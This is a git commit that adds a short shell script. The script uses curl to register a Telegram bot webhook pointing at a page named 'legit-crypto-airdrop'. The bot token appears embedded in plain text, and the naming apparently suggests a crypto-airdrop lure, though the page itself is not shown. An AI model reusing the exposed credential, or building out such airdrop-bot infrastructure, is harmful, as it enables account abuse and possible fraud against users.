f58d812c137ca3db34e2fedf92f57baf19e7000b
Abdulwajud <135984022+CYBERDRONE001@users.noreply.github.com>
2024-07-28 11:51:56 +0100

    Update

---
+++ set_webhook.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+curl -F "url=https://legit-crypto-airdrop.vercel.app/Crypto%20Airdrop.html/webhook" "https://api.telegram.org/bot<7036291463:AAFpUqgvREeydaIxx7drOMC20qOLsUj0fHQ>/setWebhook"
